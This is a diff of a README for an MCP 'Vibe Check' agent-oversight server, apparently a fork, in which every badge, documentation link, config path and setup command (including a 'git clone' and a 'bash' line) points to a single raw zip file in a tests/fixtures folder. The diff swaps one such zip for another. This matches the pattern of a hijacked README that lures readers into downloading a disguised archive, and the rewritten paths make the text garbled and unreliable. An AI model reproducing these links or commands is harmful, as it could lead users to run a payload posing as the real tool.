@@ -8,47 +8,47 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip">
-    <img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip%20%28MURST%29-blue?style=flat-square" alt="CPI Research">
+  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip">
+    <img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip%20%28MURST%29-blue?style=flat-square" alt="CPI Research">
   </a>
-  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip"><img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip%20MCP-featured-111?labelColor=111&color=555&style=flat-square" alt="Anthropic MCP: listed"></a>
-  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip"><img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip%20Registry-listed-555?labelColor=111&style=flat-square" alt="MCP Registry"></a>
-  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip">
-    <img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip%20Popular%20(Oct 2025)-0b7285?style=flat-square" alt="PulseMCP: Most Popular (this week)">
+  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip"><img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip%20MCP-featured-111?labelColor=111&color=555&style=flat-square" alt="Anthropic MCP: listed"></a>
+  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip"><img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip%20Registry-listed-555?labelColor=111&style=flat-square" alt="MCP Registry"></a>
+  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip">
+    <img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip%20Popular%20(Oct 2025)-0b7285?style=flat-square" alt="PulseMCP: Most Popular (this week)">
   </a>
-  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip"><img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip" alt="CI passing"></a>
-  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip"><img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip" alt="Smithery Badge"></a>
-  <a href="LICENSE"><img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip" alt="MIT License"></a>
+  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip"><img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip" alt="CI passing"></a>
+  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip"><img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip" alt="Smithery Badge"></a>
+  <a href="LICENSE"><img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip" alt="MIT License"></a>
 </p>
 
 <p align="center">
-  <sub> Featured on PulseMCP “Most Popular (This Week)” • 5k+ monthly calls on https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip • research-backed oversight • STDIO + streamable HTTP transport</sub>
+  <sub> Featured on PulseMCP “Most Popular (This Week)” • 5k+ monthly calls on https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip • research-backed oversight • STDIO + streamable HTTP transport</sub>
 </p>
 
-<img width="500" height="300" alt="Gemini_Generated_Image_kvdvp4kvdvp4kvdv" src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip" />
+<img width="500" height="300" alt="Gemini_Generated_Image_kvdvp4kvdvp4kvdv" src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip" />
 
-[![Version](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-[![Trust Score](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-[![Security 4.3★/5 on MSEEP](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-[![PRs Welcome](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
+[![Version](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+[![Trust Score](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+[![Security 4.3★/5 on MSEEP](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+[![PRs Welcome](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
 
 *Plug-and-play mentor layer that stops agents from over-engineering and keeps them on the minimal viable path — research-backed MCP server keeping LLMs aligned, reflective and safe.*
 
 <div align="center">
-  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip">
-    <img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip" width="40" height="40" alt="GitHub" />
+  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip">
+    <img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip" width="40" height="40" alt="GitHub" />
   </a>
   &nbsp;&nbsp;
-  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip">
-    <img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip" width="40" height="40" alt="Anthropic MCP Registry" />
+  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip">
+    <img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip" width="40" height="40" alt="Anthropic MCP Registry" />
   </a>
   &nbsp;&nbsp;
-  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip">
-    <img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip" width="40" height="40" alt="Smithery" />
+  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip">
+    <img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip" width="40" height="40" alt="Smithery" />
   </a>
   &nbsp;&nbsp;
-  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip">
-    <img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip" width="40" height="40" alt="PulseMCP" />
+  <a href="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip">
+    <img src="https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip" width="40" height="40" alt="PulseMCP" />
   </a>
 </div>
 
@@ -92,13 +92,13 @@ npx -y @pv-bhat/vibe-check-mcp start --http --port 2091
 
 npx downloads the package on demand for both options. For detailed client setup and other commands like `install` and `doctor`, see the documentation below.
 
-[![Star History Chart](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
+[![Star History Chart](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
 
 ### Recognition
-- Featured on PulseMCP “Most Popular (This Week)” front page (week of 13 Oct 2025) [🔗](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-- Listed in Anthropic’s official Model Context Protocol repo [🔗](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-- Discoverable in the official MCP Registry [🔗](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-- Featured on Sean Kochel's Top 9 MCP servers for vibe coders [🔗](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
+- Featured on PulseMCP “Most Popular (This Week)” front page (week of 13 Oct 2025) [🔗](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+- Listed in Anthropic’s official Model Context Protocol repo [🔗](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+- Discoverable in the official MCP Registry [🔗](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+- Featured on Sean Kochel's Top 9 MCP servers for vibe coders [🔗](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
 
 ## Table of Contents
 - [Quickstart (npx)](#quickstart-npx)
@@ -124,13 +124,13 @@ npx downloads the package on demand for both options. For detailed client setup 
 ---
 ## What is Vibe Check MCP?
 
-Vibe Check MCP keeps agents on the minimal viable path and escalates complexity only when evidence demands it. Vibe Check MCP is a lightweight server implementing Anthropic's [Model Context Protocol](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip). It acts as an **AI meta-mentor** for your agents, interrupting pattern inertia with **Chain-Pattern Interrupts (CPI)** to prevent Reasoning Lock-In (RLI). Think of it as a rubber-duck debugger for LLMs – a quick sanity check before your agent goes down the wrong path.
+Vibe Check MCP keeps agents on the minimal viable path and escalates complexity only when evidence demands it. Vibe Check MCP is a lightweight server implementing Anthropic's [Model Context Protocol](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip). It acts as an **AI meta-mentor** for your agents, interrupting pattern inertia with **Chain-Pattern Interrupts (CPI)** to prevent Reasoning Lock-In (RLI). Think of it as a rubber-duck debugger for LLMs – a quick sanity check before your agent goes down the wrong path.
 
 ## Overview
 
-Vibe Check MCP pairs a metacognitive signal layer with CPI so agents can pause when risk spikes. Vibe Check surfaces traits, uncertainty, and risk scores; CPI consumes those triggers and enforces an intervention policy before the agent resumes. See the [CPI integration guide](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip) and the CPI repo at https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip for wiring details.
+Vibe Check MCP pairs a metacognitive signal layer with CPI so agents can pause when risk spikes. Vibe Check surfaces traits, uncertainty, and risk scores; CPI consumes those triggers and enforces an intervention policy before the agent resumes. See the [CPI integration guide](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip) and the CPI repo at https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip for wiring details.
 
-Vibe Check invokes a second LLM to give meta-cognitive feedback to your main agent. Integrating vibe_check calls into agent system prompts and instructing tool calls before irreversible actions significantly improves agent alignment and common-sense. The high-level component map: [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip), while the CPI handoff diagram and example shim are captured in [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip).
+Vibe Check invokes a second LLM to give meta-cognitive feedback to your main agent. Integrating vibe_check calls into agent system prompts and instructing tool calls before irreversible actions significantly improves agent alignment and common-sense. The high-level component map: [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip), while the CPI handoff diagram and example shim are captured in [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip).
 
 ## The Problem: Pattern Inertia & Reasoning Lock-In
 
@@ -149,7 +149,7 @@ Large language models can confidently follow flawed plans. Without an external n
 
 - `install --client` now supports Cursor, Windsurf, and Visual Studio Code with idempotent merges, atomic writes, and `.bak` rollbacks.
 - HTTP-aware installers preserve `serverUrl` entries for Windsurf and emit VS Code workspace snippets plus a `vscode:mcp/install` link when no config is provided.
-- Documentation now consolidates provider keys, transport selection, uninstall guidance, and dedicated client docs at [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip).
+- Documentation now consolidates provider keys, transport selection, uninstall guidance, and dedicated client docs at [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip).
 
 ## Session Constitution (per-session rules)
 
@@ -163,7 +163,7 @@ Use a lightweight “constitution” to enforce rules per `sessionId` that CPI w
 ## Development Setup
 ```bash
 # Clone and install
-git clone https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip
+git clone https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip
 cd vibe-check-mcp-server
 npm ci
 npm run build
@@ -180,7 +180,7 @@ OPENAI_API_KEY=your_openai_api_key
 OPENROUTER_API_KEY=your_openrouter_api_key
 ANTHROPIC_API_KEY=your_anthropic_api_key
 ANTHROPIC_AUTH_TOKEN=your_proxy_bearer_token
-https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip
+https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip
 ANTHROPIC_VERSION=2023-06-01
 # Optional overrides
 # DEFAULT_LLM_PROVIDER accepts gemini | openai | openrouter | anthropic
@@ -190,18 +190,18 @@ DEFAULT_MODEL=gemini-2.5-pro
 
 #### Configuration 
 
-See [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip]() for instructions on how to run tests.
+See [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip]() for instructions on how to run tests.
 
 ### Docker
 The repository includes a helper script for one-command setup.
 ```bash
-bash https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip
+bash https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip
 ```
-See [Automatic Docker Setup](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip) for full details.
+See [Automatic Docker Setup](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip) for full details.
 
 ### Provider keys
 
-See [API Keys & Secret Management](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip) for supported providers, resolution order, storage locations, and security guidance.
+See [API Keys & Secret Management](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip) for supported providers, resolution order, storage locations, and security guidance.
 
 ### Transport selection
 
@@ -209,32 +209,32 @@ The CLI supports stdio and HTTP transports. Transport resolution follows this or
 
 ### Client installers
 
-Each installer is idempotent and tags entries with `"managedBy": "vibe-check-mcp-cli"`. Backups are written once per run before changes are applied, and merges are atomic (`*.bak` files make rollback easy). See [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip) for deeper client-specific references.
+Each installer is idempotent and tags entries with `"managedBy": "vibe-check-mcp-cli"`. Backups are written once per run before changes are applied, and merges are atomic (`*.bak` files make rollback easy). See [https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip) for deeper client-specific references.
 
 #### Claude Desktop
 
-- Config path: `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip` (auto-discovered per platform).
+- Config path: `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip` (auto-discovered per platform).
 - Default transport: stdio (`npx … start --stdio`).
 - Restart Claude Desktop after installation to load the new MCP server.
 - If an unmanaged entry already exists for `vibe-check-mcp`, the CLI leaves it untouched and prints a warning.
 
 #### Cursor
 
-- Config path: `~https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip` (provide `--config` if you store it elsewhere).
+- Config path: `~https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip` (provide `--config` if you store it elsewhere).
 - Schema mirrors Claude’s `mcpServers` layout.
 - If the file is missing, the CLI prints a ready-to-paste JSON block for Cursor’s settings panel instead of failing.
 
 #### Windsurf (Cascade)
 
-- Config path: legacy `~https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip`, new builds use `~https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip`.
+- Config path: legacy `~https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip`, new builds use `~https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip`.
 - Pass `--http` to emit an entry with `serverUrl` for Windsurf’s HTTP client.
 - Existing sentinel-managed `serverUrl` entries are preserved and updated in place.
 
 #### Visual Studio Code
 
-- Workspace config lives at `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip`; profiles also store `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip` in your VS Code user data directory.
+- Workspace config lives at `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip`; profiles also store `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip` in your VS Code user data directory.
 - Provide `--config <path>` to target a workspace file. Without `--config`, the CLI prints a JSON snippet and a `vscode:mcp/install?...` link you can open directly from the terminal.
-- VS Code supports optional dev fields; pass `--dev-watch` and/or `--dev-debug <value>` to populate `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip`/`https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip`.
+- VS Code supports optional dev fields; pass `--dev-watch` and/or `--dev-debug <value>` to populate `https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip`/`https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip`.
 
 ### Uninstall & rollback
 
@@ -246,9 +246,9 @@ Each installer is idempotent and tags entries with `"managedBy": "vibe-check-mcp
 **CPI (Chain-Pattern Interrupt)** is the research-backed oversight method behind Vibe Check. It injects brief, well-timed “pause points” at risk inflection moments to re-align the agent to the user’s true priority, preventing destructive cascades and **reasoning lock-in (RLI)**. In pooled evaluation across 153 runs, CPI **nearly doubles success (~27%→54%) and roughly halves harmful actions (~83%→42%)**. Optimal interrupt **dosage is ~10–20%** of steps. *Vibe Check MCP implements CPI as an external mentor layer at test time.*
 
 **Links:**  
-- 📄 **CPI Paper (ResearchGate)** — https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip  
-- 📘 **CPI Reference Implementation (GitHub)**: https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip
-- 📚 **MURST Zenodo DOI (RSRC archival)**: https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip
+- 📄 **CPI Paper (ResearchGate)** — https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip  
+- 📘 **CPI Reference Implementation (GitHub)**: https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip
+- 📚 **MURST Zenodo DOI (RSRC archival)**: https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip
 
 ```mermaid
 flowchart TD
@@ -279,17 +279,17 @@ As an autonomous agent you will:
 | 🔎 **check_constitution**  | Inspect effective rules for a session                      |
 
 ## Documentation
-- [Agent Prompting Strategies](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-- [CPI Integration](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-- [Advanced Integration](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-- [Technical Reference](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-- [Automatic Docker Setup](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-- [Philosophy](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-- [Case Studies](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
-- [Changelog](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/windsurf/mcp-check-server-vibe-1.7.zip)
+- [Agent Prompting Strategies](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
+- [CPI Integration](https://github.com/bro-gervil/vibe-check-mcp-server/raw/refs/heads/main/tests/fixtures/cursor/vibe_mcp_check_server_v1.5-beta.1.zip)
